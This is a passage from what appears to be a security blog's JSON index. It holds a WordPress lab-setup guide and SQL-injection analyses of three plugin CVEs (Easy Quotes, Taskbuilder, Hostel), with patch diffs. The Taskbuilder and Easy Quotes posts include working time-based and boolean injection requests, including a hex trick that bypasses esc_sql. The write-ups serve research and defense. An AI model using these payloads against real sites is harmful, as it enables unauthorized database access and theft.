Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.1.5.6\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: 7.6 (High)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Administrator\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/blog/posts/2025-09-20-wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e: v1.1.5.6 (vulnerable) and v1.1.5.7 (fixed)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e or any tool capable of comparing two versions to show differences\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eThe root cause is that the application injects data from a \u003cstrong\u003eGET\u003c/strong\u003e request directly into an SQL query while the validation/whitelisting is insufficient.\u003c/p\u003e","title":"CVE-2025-39566 Analysis \u0026 POC"},{"content":"WordPress is a powerful and the most popular content management system (CMS) that allows you to create, manage, and customize websites and blogs easily. It’s an open-source CMS, built on PHP, and uses either MySQL or MariaDB databases.\nReleased in 2003, initially as a blogging platform, later evolved into a full-featured system for websites, online stores, forums, landing pages, etc. Today, more than 40% of websites worldwide run on WordPress. There are two versions of WordPress:\nWordPress.com\nHosting service provided by Automattic You only need to register an account, no installation required Limited customization, advanced features require payment WordPress.org\nOpen-source, you download and install it on your own hosting/server Full customization, install plugins, themes, write code, build any website you want Ecosystem Core: The main CMS Plugins: Add-on software installed on a WordPress site to extend functionality and add new features Themes: Add-on software that defines the visual appearance and layout of a WordPress site Why WordPress Hacking? State of WordPress Security in 2024\nMost Popular Currently, over 40% of all websites worldwide run WordPress This means hackers only need to find one common vulnerability =\u0026gt; they can exploit millions of sites at once Like the saying: “fish where the fish are” Plugin and Theme WordPress Core has been reviewed for a long time by thousands of developers and researchers, making it difficult for attackers to break in However, tens of thousands of plugins and themes from various sources are in use, with inconsistent quality Many plugins have poor security code or are no longer updated. Hackers only need to scan plugins/themes for outdated versions and exploit them Setup WordPress for Hacking There are many ways to set up WordPress; searching on Google will show plenty of guides. Here, I’ll set it up on an Ubuntu (22.04) virtual machine:\nNo effect on the host machine’s services WordPress is lightweight enough to run in a VM Install and Configure WordPress Install Dependencies Install the full stack needed to run WordPress (web server + database + PHP + required extensions).\nsudo apt install apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress Download and install WordPress source code into the web directory.\n# Create a folder to store the website source code sudo mkdir -p /srv/www # Change owner to www-data, the default user for Apache/Nginx web server sudo chown www-data: /srv/www # Download the latest WordPress package from the official site # Extract it into /srv/www curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www To download a specific version:\ncurl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www Installing from wordpress.org is the most reliable method:\nUbuntu provides a wordpress package in its repo, but it’s usually outdated compared to the official release. The WordPress community only supports the official release. If you encounter issues with the Ubuntu package, they won’t help. Configure Apache for WordPress Create /etc/apache2/sites-available/wordpress.conf:\n\u0026lt;VirtualHost *:80\u0026gt; DocumentRoot /srv/www/wordpress \u0026lt;Directory /srv/www/wordpress\u0026gt; Options FollowSymLinks AllowOverride Limit Options FileInfo DirectoryIndex index.php Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;Directory /srv/www/wordpress/wp-content\u0026gt; Options FollowSymLinks Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;/VirtualHost\u0026gt; Enable WordPress site:\nsudo a2ensite wordpress Enable mod_rewrite:\nsudo a2enmod rewrite Disable default site (optional):\nsudo a2dissite 000-default Or add ServerName mywordpress.local in VirtualHost and update your system’s hosts file.\nReload Apache:\nsudo service apache2 reload Configure Database Open MySQL:\nsudo mysql -u root Create DB and user:\nCREATE DATABASE wordpress; CREATE USER wordpress@localhost IDENTIFIED BY \u0026#39;\u0026lt;your-password\u0026gt;\u0026#39;; GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; FLUSH PRIVILEGES; quit Restart MySQL:\nsudo service mysql start Configure WordPress DB Connection Copy and edit config:\nsudo -u www-data cp /srv/www/wordpress/wp-config-sample.php /srv/www/wordpress/wp-config.php Update DB info:\nsudo -u www-data sed -i \u0026#39;s/database_name_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/username_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/password_here/\u0026lt;your-password\u0026gt;/\u0026#39; /srv/www/wordpress/wp-config.php Add secret keys/salts from: https://api.wordpress.org/secret-key/1.1/salt/\nConfigure WordPress Visit http://localhost and set site title, username, password, email for the admin user.\nSetup Debug on VSCode To understand request flow, we need debugging.\nAdd PHP Debug Extension In VS Code Extensions (Ctrl+Shift+X) =\u0026gt; search PHP Debug (by Felix Becker) =\u0026gt; Install.\nInstall Xdebug sudo apt install php-xdebug -y php -v If you see with Xdebug v3.x.x, installation is OK.\nConfigure Xdebug Edit php.ini:\nzend_extension=xdebug.so xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=127.0.0.1 xdebug.client_port=9003 Restart Apache:\nsudo systemctl restart apache2 Configure VSCode launch.json Open project in VS Code:\ncode /srv/www/wordpress Add launch.json:\n{ \u0026#34;version\u0026#34;: \u0026#34;0.2.0\u0026#34;, \u0026#34;configurations\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;Listen for Xdebug\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;php\u0026#34;, \u0026#34;request\u0026#34;: \u0026#34;launch\u0026#34;, \u0026#34;port\u0026#34;: 9003, \u0026#34;pathMappings\u0026#34;: { \u0026#34;/srv/www/wordpress\u0026#34;: \u0026#34;${workspaceFolder}\u0026#34; } } ] } Now WordPress is fully set up locally with VS Code debugging.\nExtend Required Version Each WordPress version requires a compatible PHP version. Check this to avoid setup errors.\nWordPress Auto Update Since WordPress 3.7 (2013), background automatic updates exist for:\nSecurity releases Maintenance releases Not for major versions (unless explicitly enabled) WordPress checks api.wordpress.org for updates and applies them automatically.\nTo disable auto-updates, add in wp-config.php:\ndefine( \u0026#39;WP_AUTO_UPDATE_CORE\u0026#39;, false ); Increase Uploadable Plugin Size By default, WordPress relies on PHP configuration (upload_max_filesize, post_max_size, and sometimes max_execution_time) to determine the maximum file size that can be uploaded. On many servers, this limit is set as low as 2MB – 8MB, which is not enough for modern plugins.\nWhy Increase the Limit? Large plugins: Some plugins such as WooCommerce extensions, page builders, backup tools, or security suites can easily reach 20MB – 100MB.\nAvoid errors: If the plugin .zip file exceeds the limit, you’ll see errors like:\n“The uploaded file exceeds the upload_max_filesize directive in php.ini” Or the upload process fails silently. Ease of use: Increasing the limit allows administrators to upload plugins directly from the WordPress Dashboard without needing FTP/SSH access.\nDevelopment and testing: Developers testing their own plugins (with bundled assets like JS, CSS, images, or libraries) may generate larger .zip files. A higher limit makes local testing smoother.\nHow to Increase Plugin Upload Size There are several methods depending on your hosting environment:\nEdit php.ini (if you control the server)\nupload_max_filesize = 64M post_max_size = 64M max_execution_time = 300 Edit .htaccess (for Apache servers)\nphp_value upload_max_filesize 64M php_value post_max_size 64M php_value max_execution_time 300 php_value max_input_time 300 Update wp-config.php Add before the line /* That's all, stop editing! Happy publishing. */:\n@ini_set( \u0026#39;upload_max_filesize\u0026#39; , \u0026#39;64M\u0026#39; ); @ini_set( \u0026#39;post_max_size\u0026#39;, \u0026#39;64M\u0026#39;); @ini_set( \u0026#39;max_execution_time\u0026#39;, \u0026#39;300\u0026#39; ); 👉 It’s recommended to set a reasonable value (e.g., 64MB or 128MB). Avoid setting it too high (hundreds of MBs), as it may open the door to abuse (e.g., users uploading excessively large files that overload the server).\n","permalink":"//localhost:1313/posts/2025-09-20-wordpress-local-and-debugging/","summary":"\u003cp\u003e\u003cstrong\u003eWordPress\u003c/strong\u003e is a powerful and the most popular content management system (CMS) that allows you to create, manage, and customize websites and blogs easily. It’s an open-source CMS, built on PHP, and uses either MySQL or MariaDB databases.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eReleased in 2003, initially as a blogging platform, later evolved into a full-featured system for websites, online stores, forums, landing pages, etc.\u003c/li\u003e\n\u003cli\u003eToday, more than 40% of websites worldwide run on WordPress.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eThere are two versions of WordPress:\u003c/p\u003e","title":"WordPress Local and Debugging"},{"content":"The vulnerability exists in the Easy Quotes plugin for WordPress prior to version 1.2.3. This could allow attackers to directly interact with your database, including but not limited to data theft.\nCVE ID: CVE-2025-26943 Product: WordPress Easy Quotes Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.2.2 CVSS severity: High (9.3) Required Privilege: Unauthenticated Requirements Local WordPress and Debugging Taskbuilder Plugin: v1.2.2(vulnerable) and v1.2.3(fixed) diff tool: meld or any other tool to compare and see differences between the two versions Analysis The application directly injected user input into an SQL query without using safeguards, leading to an SQL Injection vulnerability.\nPatch Diff Use any diff tool to compare the vulnerable and patched versions. A clear difference can be found in the file includes/quotes-data.php:\nprivate static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-families\u0026#39;; return $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM `\u0026#34;.$tablename.\u0026#34;` WHERE `family`=\u0026#39;\u0026#34;.$family.\u0026#34;\u0026#39;;\u0026#34;); } The patch uses $wpdb-\u0026gt;prepare() instead of directly injecting user input into the query:\nprivate static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-families\u0026#39;; $sql = $wpdb-\u0026gt;prepare( \u0026#34;SELECT * FROM %i WHERE `family` = %s\u0026#34;, $tablename, $family ); return $wpdb-\u0026gt;get_row($sql); } Several other functions were patched the same way, such as: get_font_variant($family_id, $variant_id), get_font_variants($family), get_fonts($category = -1)\nAlthough get_fonts_categories() was also patched, it did not handle user input, so it was not a concern:\npublic static function get_fonts_categories() { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-categories\u0026#39;; $sql = $wpdb-\u0026gt;prepare( \u0026#34;SELECT `category_id`, `category` FROM %i\u0026#34;, $tablename ); return $wpdb-\u0026gt;get_results($sql); } How it works The SQL Injection resides in get_family_data($family), and similar logic applies to other functions.\nget_family_data() is a private method inside the Quotes_Data class:\nclass Quotes_Data { function __construct() { add_filter(\u0026#39;posts_where\u0026#39;, array($this, \u0026#39;posts_where\u0026#39;), 10, 2); } // other function public static function get_font_variants($family) { $familyData = self::get_family_data($family); // other logic } public static function get_family($family, $variant_id) { $family_data = (array)self::get_family_data($family); // other logic } private static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-families\u0026#39;; return $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM `\u0026#34;.$tablename.\u0026#34;` WHERE `family`=\u0026#39;\u0026#34;.$family.\u0026#34;\u0026#39;;\u0026#34;); } } get_family_data() is called by both get_family() and get_font_variants(). To locate where they’re used, we can search using the keywords get_family or get_font_variants:\nThe method get_font_variants() is invoked in the rest_route_callback_font_variants() method of the Quotes_Rest_Route class:\nclass Quotes_Rest_Route { function __construct() { add_action(\u0026#39;rest_api_init\u0026#39;, array($this, \u0026#39;rest_api_init\u0026#39;)); } /** * Register my REST route * * @return void */ function rest_api_init($wp_rest_server) { $args = [ \u0026#39;method\u0026#39; =\u0026gt; WP_REST_Server::READABLE, \u0026#39;callback\u0026#39; =\u0026gt; [$this, \u0026#39;rest_route_callback_quote\u0026#39;], \u0026#39;permission_callback\u0026#39; =\u0026gt; \u0026#39;__return_true\u0026#39; ]; register_rest_route(\u0026#39;layart/v1\u0026#39;, \u0026#39;/quote\u0026#39;, $args); // other logic $args[\u0026#39;callback\u0026#39;] = [$this, \u0026#39;rest_route_callback_font_variants\u0026#39;]; register_rest_route(\u0026#39;layart/v1\u0026#39;, \u0026#39;/font-variants\u0026#39;, $args); } // other function function rest_route_callback_font_variants(WP_REST_Request $request) { $family = $request-\u0026gt;get_param(\u0026#39;family\u0026#39;); $family = isset($family) ? $family : \u0026#34;Shadows Into Light\u0026#34;; $response = Quotes_Data::get_font_variants($family); return rest_ensure_response($response); } } The constructor of Quotes_Rest_Route uses add_action(hook_name, callback) with hook_name set to rest_api_init to register custom endpoints with WordPress’s REST API system.\nThe callback rest_api_init repeatedly uses register_rest_route to create endpoints under the layart/v1 namespace.\nrest_route_callback_font_variants serves as the callback for the endpoint:\n/wp-json/layart/v1/font-variants?family=family_name If no family parameter is provided, the default value is \u0026quot;Shadows Into Light\u0026quot;.\nExploit Detect SQLi We attempt Boolean-based SQL Injection to test whether the family parameter is injectable.\nTrue request: Executed query:\nSELECT * FROM wp_easy-quotes-families WHERE family=\u0026#39;Roboto\u0026#39;+AND+\u0026#39;1\u0026#39;=\u0026#39;1\u0026#39;\u0026#34; Since AND '1'='1' is always true, the query is valid and returns normal data.\nFalse request: Executed query:\nSELECT * FROM wp_easy-quotes-families WHERE family=\u0026#39;Roboto\u0026#39;+AND+\u0026#39;1\u0026#39;=\u0026#39;2\u0026#39;\u0026#34; Since AND '1'='2' is always false, the query returns [].\nGet First Letter of Database Name To dump all data, it’s essential to first extract at least one character of the database name.\nIn this case, the database name is wordpress, so the first letter is w.\nThe response returns valid data, confirming the first character is w.\nExecuted query:\nSELECT * FROM wp_easy-quotes-families WHERE family=\u0026#39;Roboto\u0026#39;+AND+SUBSTRING(DATABASE(),1,1)=\u0026#39;w\u0026#39;\u0026#34; Conclusion The CVE-2025-26943 vulnerability in the WordPress Easy Quotes plugin before version 1.2.3 stems from not using query preparation ($wpdb-\u0026gt;prepare) and directly concatenating user input into SQL statements, leading to SQL Injection.\nThe official patch replaces string concatenation with $wpdb-\u0026gt;prepare, ensuring safer input handling.\nKey takeaways:\nAlways use $wpdb-\u0026gt;prepare() when working with databases in WordPress to prevent SQL Injection. Regularly update plugins and perform security audits to avoid becoming a target. References SQL Injection cheat sheet - PortSwigger\nWordPress Easy Quotes Plugin \u0026lt;= 1.2.2 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/posts/2025-09-23-cve-2025-26943/","summary":"\u003cp\u003eThe vulnerability exists in the \u003cstrong\u003eEasy Quotes\u003c/strong\u003e plugin for WordPress prior to version \u003cstrong\u003e1.2.3\u003c/strong\u003e. This could allow attackers to directly interact with your database, including but not limited to data theft.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-26943\"\u003eCVE-2025-26943\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/easy-quotes/#description\"\u003eWordPress Easy Quotes Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.2.2\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: High (9.3)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Unauthenticated\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTaskbuilder Plugin\u003c/strong\u003e:  v1.2.2(vulnerable) and v1.2.3(fixed)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e or any other tool to compare and see differences between the two versions\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eThe application directly injected user input into an SQL query \u003cstrong\u003ewithout using safeguards\u003c/strong\u003e, leading to an SQL Injection vulnerability.\u003c/p\u003e","title":"CVE-2025-26943"},{"content":"The vulnerability occurs in the Taskbuilder WordPress plugin before version 4.0.2. This could allow an attacker to directly interact with your database, including, but not limited to, stealing information.\nCVE ID: CVE-2025-39569 Product: WordPress Taskbuilder Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt; 4.0.2 CVSS Severity: High (8.5) Required Privilege: Subscriber Requirements Local WordPress and Debugging Taskbuilder Plugin: v4.0.1 (vulnerable) and v4.0.2 (patched) Diff Tool: meld or any tool that can compare files to see differences between two versions Analysis The application sanitizes input data before using it in SQL queries. However, during query construction, this value is inserted directly without being wrapped in single quotes '...'. This allows an attacker to inject valid SQL syntax (such as OR, AND, etc.) into the query, resulting in a SQL Injection vulnerability.\nPatch Diff Use any diff tool to compare differences between the vulnerable version and the patched version.\nThe clear difference is in the file includes/admin/projects/get_users.php.\nIn version v4.0.1, the variable $proj_id is escaped but inserted directly into the query without quotes:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = $proj_id\u0026#34; ); In version v4.0.2, the query is adjusted to wrap $proj_id in quotes after escaping:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = \u0026#39;$proj_id\u0026#39;\u0026#34; ); This patch ensures that the $proj_id value after escaping is treated as a literal string, preventing it from escaping the quotes to inject SQL syntax, effectively mitigating the SQL Injection.\nHow It Works File Architecture:\nGeneral structure of the current file:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project WHERE id = $proj_id\u0026#34;); // Start buffer to generate the main modal content ob_start(); // ... render HTML user list $body = ob_get_clean(); // Start buffer to generate modal footer ob_start(); // ... render HTML buttons (Close, Save) $footer = ob_get_clean(); // Return JSON data for frontend modal rendering echo json_encode([ \u0026#39;body\u0026#39; =\u0026gt; $body, \u0026#39;footer\u0026#39; =\u0026gt; $footer, ]); $proj_id / $project: Fetch project data from the database. ob_start() / ob_get_clean(): Buffer HTML output instead of printing directly, storing it in a variable. $body / $footer: Contain dynamic HTML for the modal. json_encode(): Returns JSON to the client, often used in Ajax to render modals without refreshing the page. The file is located in includes, suggesting it’s called from another feature. To find where it’s used, search for get_users.php in the plugin directory.\n👉 It is included in the function wppm_get_users() of the class WPPM_Admin in class-wppm-admin.php. wppm_get_users() is a callback for a WordPress action hook.\nWPPM_Admin constructor:\nfinal class WPPM_Admin { public function __construct() { // other actions add_action( \u0026#39;wp_ajax_wppm_get_users\u0026#39;, array($this,\u0026#39;wppm_get_users\u0026#39;)); // other actions } } add_action() is a WordPress Plugin API method to attach a callback to an action hook.\nwp_ajax_wppm_get_users is an Ajax hook name:\nwp_ajax_{action} → handles Ajax for logged-in users. wp_ajax_nopriv_{action} → handles Ajax for non-logged-in users. Here, action = wppm_get_users. If you send action=wppm_get_users via Ajax to admin-ajax.php, WordPress will execute the corresponding callback, here wppm_get_users().\n👉 Knowing action = wppm_get_users, you can find which Ajax requests use it by searching wppm_get_users in .js files of the plugin.\nThe wppm_get_users action is the data part in the POST request handled by wppm_get_users().\nThe function is referenced in HTML attributes of the project feature:\nCreate a new project Access that project Inspect code to locate wppm_get_users and see which actions call it 👉 Clicking the icon next to Users triggers Ajax, sending a request to the server to fetch project users and render them in HTML.\nExploit Detect SQLi Capture requests using BurpSuite and send a time-based SQLi payload:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+SLEEP(1)) Response delay indicates a successful SQL Injection.\nGet First Letter of Database Name To dump all data, the first step is to extract at least one character of the database name. Once retrieved, the rest can be dumped.\nSend a boolean-based SQLi payload with the correct proj_id:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,4,999)) Database name is wordpress, so the first character is w (HEX 0x77).\nSUBSTRING(STRING,1,1) retrieves the first character.\nHere, $proj_id = 4. Since SUBSTRING('wordpress',1,1)=0x77 is true, the IF(condition, value_if_true, value_if_false) returns 4, which exists in the database, so the response contains the project users.\nUsing HEX technique bypasses the esc_sql() function (see Patch Diff) when quotes cannot be used.\nSend a boolean-based SQLi payload with a wrong proj_id:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,999,4)) With a non-existent proj_id, the response contains None.\n👉 We successfully retrieved the first character of the database name using boolean-based SQLi:\nCorrect proj_id: response without None Wrong proj_id: response contains None Time-based SQLi could also be used, but dumping large data sets would be slow.\nConclusion The CVE-2025-39569 vulnerability in WordPress Taskbuilder arises from the missing single quotes '...' around user input in SQL queries, allowing user data to be interpreted as valid SQL syntax.\nThe patch in v4.0.2 fixed this by wrapping $proj_id in quotes, ensuring it is always treated as a literal string in SQL.\nKey Takeaways:\nPrefer prepared statements ($wpdb-\u0026gt;prepare() in WordPress) over manually inserting variables into queries. For WordPress plugins, thoroughly test Ajax endpoints, as they are the most common sources of SQLi and XSS. Administrators should regularly update plugins/themes to receive security patches promptly. References SQL Injection Cheat Sheet - PortSwigger\nWordPress Taskbuilder \u0026lt;= 4.0.1 Vulnerable to SQL Injection\n","permalink":"//localhost:1313/posts/2025-09-22-cve-2025-39569/","summary":"\u003cp\u003eThe vulnerability occurs in the \u003cstrong\u003eTaskbuilder\u003c/strong\u003e WordPress plugin before version \u003cstrong\u003e4.0.2\u003c/strong\u003e. This could allow an attacker to directly interact with your database, including, but not limited to, stealing information.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39569\"\u003eCVE-2025-39569\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/taskbuilder/\"\u003eWordPress Taskbuilder Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt; 4.0.2\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS Severity\u003c/strong\u003e: High (8.5)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Subscriber\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTaskbuilder Plugin\u003c/strong\u003e: v4.0.1 (vulnerable) and v4.0.2 (patched)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eDiff Tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e or any tool that can compare files to see differences between two versions\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eThe application \u003cstrong\u003esanitizes input data\u003c/strong\u003e before using it in SQL queries. However, during query construction, this value is inserted directly without being wrapped in single quotes \u003ccode\u003e'...'\u003c/code\u003e. This allows an attacker to inject valid SQL syntax (such as \u003ccode\u003eOR\u003c/code\u003e, \u003ccode\u003eAND\u003c/code\u003e, etc.) into the query, resulting in a SQL Injection vulnerability.\u003c/p\u003e","title":"CVE-2025-39569 Analysis \u0026 POC"},{"content":"A vulnerability in the Hostel plugin prior to version 1.1.5.7. Because input is not sanitized properly, this may allow an attacker to interact directly with the database, including but not limited to data exfiltration.\nCVE ID: CVE-2025-39566 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.1.5.6 CVSS severity: 7.6 (High) Required Privilege: Administrator Requirements Local WordPress and Debugging Hostel Plugin: v1.1.5.6 (vulnerable) and v1.1.5.7 (fixed) diff tool: meld or any tool capable of comparing two versions to show differences Analysis The root cause is that the application injects data from a GET request directly into an SQL query while the validation/whitelisting is insufficient.\nPatch Diff Use any diff tool to compare the vulnerable version and the patched version. A clear difference exists in the file controllers/bookings.php\nVulnerable version:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } Patched version:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) { $ob = sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]); if(!in_array($ob, [\u0026#39;tB.id\u0026#39;, \u0026#39;tB.contact_name\u0026#39;, \u0026#39;tB.contact_email\u0026#39;, \u0026#39;tB.from_date\u0026#39;, \u0026#39;tB.amount_paid\u0026#39;, \u0026#39;tB.status\u0026#39;])) { $ob = \u0026#39;tB.id\u0026#39;; } $orderby = \u0026#34;ORDER BY $ob $dir\u0026#34;; } 👉 The patch uses a whitelist to restrict which columns can be used for ordering; if the supplied value is not valid it falls back to 'tB.id'.\nAnalysis: The vulnerability appears because the ob parameter is passed directly into the ORDER BY clause after sanitize_text_field(). That function only escapes/cleans text for HTML contexts and does not validate or filter for SQL injection in an SQL context.\nHow it works To inject, we need to identify the complete query used here:\n$bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); The query resides in the default branch of the switch structure.\nAll this logic belongs to the static manage() method of the WPHostelBookings class.\nclass WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET[\u0026#39;do\u0026#39;]) { case \u0026#39;add\u0026#39;: // add handle break; case \u0026#39;edit\u0026#39;: // edit handle break; // view/print booking details. Will allow also to confirm/cancel case \u0026#39;view\u0026#39;: // view handle\tbreak;\t// list bookings default: // another logic if(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } $bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); // another logic break; } } } In WordPress, plugins communicate with core via the Plugin API (Hook System). Therefore, to find where manage() is invoked, we can search for the string \u0026quot;manage\u0026quot; in the plugin folder.\nIn the file models/hostel.php we have:\nclass class WPHostel { // another logic static function menu() { // we use \u0026#39;hostelpro_manage\u0026#39; for consistency with the pro version $wphostel_caps = current_user_can(\u0026#39;manage_options\u0026#39;) ? \u0026#39;manage_options\u0026#39; : \u0026#39;hostelpro_manage\u0026#39;; add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_rooms\u0026#39;, array(\u0026#39;WPHostelRooms\u0026#39;, 